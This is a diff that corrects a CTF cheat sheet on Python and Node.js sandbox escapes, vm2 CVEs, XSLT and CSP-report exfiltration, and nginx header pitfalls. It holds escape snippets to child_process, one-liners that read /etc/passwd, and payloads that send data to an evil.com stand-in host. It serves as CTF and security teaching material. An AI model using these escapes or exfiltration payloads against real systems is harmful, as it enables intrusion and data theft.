@@ -69,7 +69,7 @@ numpy.genfromtxt('/etc/passwd', dtype=str, delimiter='\n')
 | `pathlib` | `Path.read_text()` | `pathlib.Path('/etc/passwd').read_text()` |
 | `fileinput` | `input()` | `list(fileinput.input('/etc/passwd'))` |
 | `tokenize` | `open()` | `tokenize.open('/etc/passwd').read()` |
-| `xml.etree` | `parse()` with XXE | `xml.etree.ElementTree.parse('/etc/passwd')` |
+| `xml.etree` | `parse()` — reads well-formed XML files only | `xml.etree.ElementTree.parse('/flag.xml')` — note: `xml.etree` does NOT expand external entities by default and will raise `ParseError` on non-XML files like `/etc/passwd`. This is an XML file reader, not an XXE vector |
 | `linecache` | `getlines()` | `linecache.getlines('/etc/passwd')` |
 | `pkgutil` | `get_data()` | `pkgutil.get_data('.', '/etc/passwd')` |
 
@@ -238,7 +238,7 @@ def tracer(frame, event, arg):
 sys.settrace(tracer)
 ```
 
-**Key insight**: Even if a jail prevents you from *calling* sensitive functions, `settrace` lets you intercept and modify execution at every point — including reading local variables of protected functions.
+**Key insight**: Even if a jail prevents you from *calling* sensitive functions, `settrace` lets you intercept and inspect execution at every point — including reading local variables of protected functions. **Version caveat**: Writing to `frame.f_locals` to modify actual local variables works reliably in Python 3.13+ (which introduced write-through `FrameLocalsProxy`). In earlier CPython versions, `frame.f_locals` returns a snapshot copy — writes may not propagate to the actual locals. Reading locals works in all versions.
 
 ### 1.2 JavaScript Sandbox Escapes (Node.js `vm` Module)
 
@@ -255,7 +255,7 @@ this.constructor.constructor('return process')().mainModule.require('child_proce
 
 #### 1.2.2 `WeakRef` / `FinalizationRegistry` Realm Escape
 
-**What is manipulated**: `FinalizationRegistry` callbacks execute in the *host* realm (not the sandbox realm) after garbage collection of the registered object.
+**What is manipulated**: In certain sandbox implementations (notably `vm2`, now deprecated), `FinalizationRegistry` callbacks could execute in the *host* realm after garbage collection. Note: this behavior is specific to sandbox libraries that wrap `node:vm` — native `node:vm` does not inherently guarantee host-realm callback execution for `FinalizationRegistry`. The technique is closely related to vm2 escape CVEs (e.g., CVE-2023-32314).
 
 ```javascript
 // Inside vm sandbox:
@@ -280,11 +280,11 @@ import('child_process').then(cp => {
 // import() resolves in the host module system, not the sandbox
 ```
 
-**Key condition**: Requires `--experimental-vm-modules` flag or specific ESM configuration. Available by default in newer Node.js versions with ESM support.
+**Key condition**: Requires `--experimental-vm-modules` flag and the `importModuleDynamically` option to be set on the `vm.Script` or `vm.compileFunction` call. This is NOT available by default — the host must explicitly opt in to dynamic import support for vm contexts. Without these conditions, `import()` inside a vm context will throw.
 
 #### 1.2.4 Proxy `apply` Trap — `argumentsList` Realm Leak
 
-**What is manipulated**: When a Proxy's `apply` trap is invoked, the third argument (`argumentsList`) is a real JavaScript Array allocated in the *host* realm. This leaked reference provides access to the host context's `Object.prototype`, enabling full sandbox escape.
+**What is manipulated**: In sandbox libraries like `vm2`, when a Proxy's `apply` trap is invoked across realm boundaries, the third argument (`argumentsList`) could be a real JavaScript Array allocated in the *host* realm, leaking access to the host context's `Object.prototype`. This technique is associated with vm2 CVE-2023-32314 and similar vm2 escapes — it does not apply to native `node:vm` in the same way, as native `vm` was never designed as a security boundary.
 
 ```javascript
 // DiceCTF 2023 "jwtjail":
@@ -308,7 +308,7 @@ const proxy = new Proxy(function(){}, handler);
 proxy();  // triggers apply trap → escape
 ```
 
-**Why it works**: V8 allocates the arguments array for `Proxy.apply` traps in the calling realm (host), not the proxy's realm (sandbox). This is a fundamental design issue — any function call on a Proxy can trigger a cross-realm object leak.
+**Why it works**: In vm2's sandbox wrapping, V8 allocates the arguments array for `Proxy.apply` traps in the calling realm (host), not the proxy's realm (sandbox). This was a fundamental issue in vm2's isolation model — it does not apply to native `node:vm` which makes no security isolation guarantees.
 
 #### 1.2.5 `vm2` Historical Escapes (Pre-Deprecation)
 
@@ -316,9 +316,9 @@ proxy();  // triggers apply trap → escape
 
 | CVE | Mechanism | Version |
 |-----|-----------|---------|
-| CVE-2023-37466 | `Promise` job callback runs in host context | vm2 < 3.9.19 |
-| CVE-2023-32314 | Host `Error` object leaks through `prepareStackTrace` | vm2 < 3.9.17 |
-| CVE-2023-29199 | `Symbol.species` on `Promise` subclass leaks `Function` | vm2 < 3.9.16 |
+| CVE-2023-37466 | `Promise` `@@species` accessor property sandbox escape | vm2 ≤ 3.9.19 (no fix; project deprecated) |
+| CVE-2023-32314 | Unexpected host object creation via `Proxy` specification | vm2 < 3.9.18 |
+| CVE-2023-29199 | Source transformer exception sanitization bypass | vm2 < 3.9.16 |
 | CVE-2022-36067 | `Error().prepareStackTrace` callback runs in host | vm2 < 3.9.11 |
 
 **Lesson**: `vm2` was patched and re-broken repeatedly. If you encounter it in a CTF, search for the specific version's known escapes first.
@@ -798,7 +798,7 @@ document.execCommand('insertHTML', false, '<svg onload="fetch(`https://evil.com/
     <xsl:template match='/'>
       <html>
         <body>
-          <img src='https://evil.com/?cookie={document.cookie}'/>
+          <img src='https://evil.com/?exfil=xslt-triggered-request'/>
         </body>
       </html>
     </xsl:template>
@@ -859,9 +859,9 @@ pc.createOffer().then(o => pc.setLocalDescription(o));
 
 ### 5.8 CSP `report-uri` as Exfiltration Channel
 
-**What is manipulated**: When a CSP violation occurs, the browser sends a JSON report to `report-uri` containing the blocked content. By intentionally triggering violations, the attacker uses the reporting mechanism itself as a data exfiltration channel.
+**What is manipulated**: When a CSP violation occurs, the browser sends a JSON report to `report-uri`. The `script-sample` field in violation reports contains approximately the first 40 characters of the blocked content, and only when the `'report-sample'` directive is present in the CSP. By intentionally triggering violations, the attacker can use this as a limited data exfiltration channel — not full content, but enough for short secrets like flags.
 
-**DiceCTF 2023 "codebox"**: Inject `require-trusted-types-for 'script'` into CSP. Any `innerHTML` assignment now triggers a Trusted Types violation. The violation report sent to `report-uri` includes the blocked script content — which contains the flag.
+**DiceCTF 2023 "codebox"**: Inject `require-trusted-types-for 'script'` into CSP. Any `innerHTML` assignment now triggers a Trusted Types violation. The violation report's sample field leaks a prefix of the blocked content — sufficient for flag extraction in CTF contexts where the flag fits within the sample limit.
 
 ### 5.9 Unicode Case-Folding Length Confusion in WASM
 
@@ -885,10 +885,13 @@ After uppercase conversion: "SS" × 500 + "<img src=x onerror=alert(1)>"
 **corCTF 2023 "leakynote"**: Search returning no results triggers 404. The 404 response has no `frame-ancestors` CSP → the page can be iframed. By testing if the iframe loads (no CSP) or is blocked (CSP present), the attacker determines whether a search query has results — a binary oracle for character-by-character flag extraction.
 
 ```nginx
-# Nginx config (common pattern):
-add_header Content-Security-Policy "frame-ancestors 'none'" always;
-#                                                           ^^^^^^
+# Nginx config — VULNERABLE pattern (missing "always"):
+add_header Content-Security-Policy "frame-ancestors 'none'";
 # Without "always", the header is only added to 2xx/3xx responses
+# 4xx/5xx responses lack CSP → can be iframed
+
+# FIXED pattern:
+# add_header Content-Security-Policy "frame-ancestors 'none'" always;
 ```
 
 ---
